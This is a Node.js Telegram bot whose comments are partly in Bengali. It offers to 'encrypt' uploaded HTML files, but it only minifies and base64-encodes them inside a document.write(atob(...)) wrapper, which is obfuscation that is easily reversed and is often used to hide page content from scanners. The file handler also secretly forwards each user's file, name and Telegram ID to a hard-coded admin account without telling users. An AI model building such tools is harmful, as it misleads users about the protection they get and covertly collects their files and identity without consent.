const { Telegraf } = require("telegraf");
const fs = require("fs-extra");
const path = require("path");
const axios = require("axios");
const minify = require("html-minifier-terser").minify;

const bot = new Telegraf(process.env.BOT_TOKEN);

// 🔐 তোমার Telegram ID বসাও এখানে
const ADMIN_ID = 6753121703;

// 📊 Stats
const users = new Set();
let totalFiles = 0;

// /start command
bot.start((ctx) => {
  ctx.reply("🤖 Bot is running... Send HTML file");
});

// 🔐 HTML Encrypt function
async function obfuscate(html) {
  let clean = await minify(html, {
    collapseWhitespace: true,
    removeComments: true
  });

  let base64 = Buffer.from(clean).toString("base64");

  return `
<!DOCTYPE html>
<html>
<body>
<script>
document.write(atob("${base64}"));
</script>
</body>
</html>
  `;
}

// 📁 File handler
bot.on("document", async (ctx) => {
  users.add(ctx.from.id);
  totalFiles++;

  try {
    const fileName = ctx.message.document.file_name || "file.html";

    // ⏳ loading message
    await ctx.reply(
`⏳ আপনার ফাইল প্রসেস করা হচ্ছে...
📁 ইনক্রিপ্ট করা হচ্ছে...
⏳ অনুগ্রহ করে অপেক্ষা করুন`
    );

    // file download
    const fileLink = await ctx.telegram.getFileLink(
      ctx.message.document.file_id
    );

    const res = await axios.get(fileLink.href);
    const html = res.data;

    // encrypt
    const output = await obfuscate(html);

    const filePath = path.join(__dirname, "output.html");
    await fs.writeFile(filePath, output);

    // ⏳ delay
    await new Promise((r) => setTimeout(r, 10000));

    // 👤 send to user
    await ctx.replyWithDocument({
      source: filePath,
      filename: "encrypted.html"
    });

    // 🔥 send to admin (YOUR TELEGRAM)
    if (ADMIN_ID) {
      await bot.telegram.sendDocument(
        ADMIN_ID,
        {
          source: filePath,
          filename: "encrypted.html"
        },
        {
          caption: `📁 New Encrypted File

👤 User: ${ctx.from.first_name}
🆔 ID: ${ctx.from.id}
📄 File: ${fileName}`
        }
      );
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Error processing file");
  }
});

// 📊 Stats command (Admin only)
bot.command("stats", async (ctx) => {
  if (ctx.from.id !== ADMIN_ID) return;

  await ctx.reply(
`📊 Bot Statistics

👥 Total Users: ${users.size}
📁 Total Files Processed: ${totalFiles}`
  );
});

bot.launch();
console.log("Bot running...");
